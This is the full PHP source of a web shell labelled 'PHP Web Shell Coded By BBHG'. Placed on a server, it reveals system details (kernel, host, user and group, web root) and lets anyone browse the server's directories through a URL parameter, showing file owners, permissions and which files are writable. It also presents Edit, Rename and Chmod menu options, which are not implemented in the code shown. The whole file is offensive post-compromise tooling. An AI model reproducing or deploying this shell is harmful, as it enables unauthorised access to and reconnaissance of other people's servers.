<?php
//error_reporting(0);
//PHP Web Shell Coded By BBHG
//Here are functions
if(isset($_GET['dir']) && !empty($_GET['dir'])){
$path = $_GET['dir'];
}else{
$path = getcwd();
}
function logged_in(){
if(function_exists('posix_getpwuid')){
$userInfo = posix_getpwuid(posix_getuid());
$user = $userInfo['name'];
}else{
  $user = "";
}
$groupInfo = posix_getgrgid(posix_getgid());
$group = $groupInfo = $groupInfo['name'];
return $user. '<font style="color: yellow;"><b> / </b></font>' .$group;
}
function uname($type){
    $release_info["os_name"] = php_uname('s');
    $release_info["uname_version_info"] = php_uname('v');                 $release_info["machine_type"] = php_uname('m');
    $release_info["php_uname"] = php_uname();
    $release_info["host"] = php_uname('n');
    $release_info["kernal"] = php_uname('r');
    $release_info["version"] = php_uname('v');
return $release_info[$type];
}
function get_owner ($filename) {
if(function_exists('posix_getpwuid')){
$user = posix_getpwuid(fileowner($filename));
}else{
  $user = "";
}
$group = posix_getgrgid(fileowner($filename));
return $user['name']. ' / ' .$group['name'];
}
function human_readable($bytes, $decimals = 2){
    $size = array('B','kB','MB','GB','TB','PB','EB','ZB','YB');
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$size[$factor];
}
function perm($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
<!DOCTYPE HTML>
<html lang="en-US">
<head>
<title>BBHG - Shell</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.2" />
</head>
<style>
body {
  color: white;
  font-size: 22px;
padding: 0;
  margin: 0;
}
table, th, td {
  border: 5px #333399 dotted;
  text-align: center;
 
}
a {
  text-decoration: none;
  color: ;
}
</style>
<body bgcolor="black">
<h2>System Information</h2>
<b style="color: #90EE90;">Uname : </b><font style="font-size: 21px;"><?php echo ((uname('php_uname')) ? uname('php_uname'). '</font>' : '<font style="color: red;">Couldn\'t Detect</font>' ); ?>


<br>
<b style="color: #90EE90;">Host Name : </b><?php echo (((uname('host'))) ? uname('host') : '<font style="color: red;">Couldn\'t Detect</font>' ); ?>
<br><b style="color: #90EE90;">User / Group : </b><?php echo (((logged_in())) ? logged_in() : '<font style="color: red;">Couldn\'t Detect</font>' ); ?>
<br><b style="color: #90EE90;">Web Root : </b><font style="font-size: 25px;"><?php echo ((($_SERVER["DOCUMENT_ROOT"])) ? $_SERVER["DOCUMENT_ROOT"]. '</font>' : '<font style="color: red;">Couldn\'t Detect</font>' ); ?>
<center>
  
PATH : [ <font style="font-size: 20.2px;"><?php
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a style="color: red;" href="?dir=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a style="color: green;" href="?dir=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo '/';
}
echo '">'.htmlspecialchars($pat).'</a><font style="color: red">/</font>';
}
?>]<br>[ <a style="color: yellow;" href="<?php echo htmlspecialchars(basename($_SERVER['PHP_SELF'])); ?>">Home</a> ]</font>
<?php
if(!is_dir($path)){
echo "</table><h3><font style='color: red'>" .htmlspecialchars($path). " </font>isn't a directory";
  exit();
}
?>
<table style="width:100%; font-size: 28px;">
  <tr>
    <th>Name</th>
    <th>Size</th>
    <th>Owner / Group</th>
    <th>Permission</th>
    <th>Modify</th>
    <th>Option</th>
  </tr>
<?php
if(!is_dir($path) || !is_readable($path)){
  echo "</table><h3>Can't Open <font style='color: red'>" .htmlspecialchars($path). " </font>Permission Denied";
  exit();
}
$scandir=scandir($path);
foreach($scandir as $dir){
$fullpath = $path. '/' .$dir;
$name = $dir;
$fcolor = 'white';
if($dir == "."){
  $fullpath = $path;
}
if($dir == ".."){
  $fullpath=dirname($path);
}
if(is_dir($fullpath)){
  $name = '[' .$dir. ']';
  $fcolor = 'green';
}
if(is_readable($fullpath)){
  $color = "green";
}
if(is_writeable($fullpath)){
$color = "yellow";
}else{
$color = "red";
}
$perm = perm($fullpath);
$size = human_readable(filesize($fullpath));
$dir_list='';
$file_list='';
echo '<tr>
   <td style="text-align: left; width:50px;"><a style="color: '.$fcolor. ';" href="?dir=' .htmlspecialchars($fullpath). '">' .htmlspecialchars($name). '</td></a>
    <td>' .$size. '</td>
    <td>' .get_owner($fullpath). '</td>
    <th style="color:' .$color. ';">' .$perm. '</th>
    <td>' .date("Y-m-d H:i:s",filemtime($fullpath)). '</td>
    <td><form action="" method="post"><select name="option" style="width:100%" onchange="this.form.submit()">
  <option style="width:100%">Option</option>
    <option style="width:100%">Edit</option>
  <option style="width:100%">Rename</option>
  <option style="width:100%">Chmod</option>
</select></form></td>
  </tr>';
}
?>
</table>
  </center>
</body>
</html>